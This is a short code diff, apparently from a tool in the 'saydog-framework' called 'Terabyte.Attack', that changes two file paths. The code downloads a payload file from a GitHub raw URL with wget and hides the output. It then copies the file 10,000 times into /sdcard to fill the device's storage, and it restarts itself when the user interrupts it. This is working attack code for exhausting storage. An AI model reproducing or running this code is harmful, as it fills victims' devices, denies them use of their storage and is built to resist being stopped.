@@ -19,7 +19,7 @@ logo = """\x1b[91m
 def main():
 	try:
 		for i in range(10000):
-			os.system("cp Terabyte.Attack.db /sdcard"+str(i))
+			os.system("cp Terabyte.Attack /sdcard"+str(i))
 	except KeyboardInterrupt:
 		main()
 
@@ -46,7 +46,7 @@ def space():
 	
 def run():
 	try:
-		os.system('wget https://raw.githubusercontent.com/saydog-official/saydog-framework/master/modules/pytoolkit/Terabyte.attack &> /dev//null')
+		os.system('wget https://raw.githubusercontent.com/saydog-official/saydog-framework/master/.core/modules/others/toolkit/Terabyte.attack &> /dev//null')
 		os.system('clear')
 		space()
 		main()
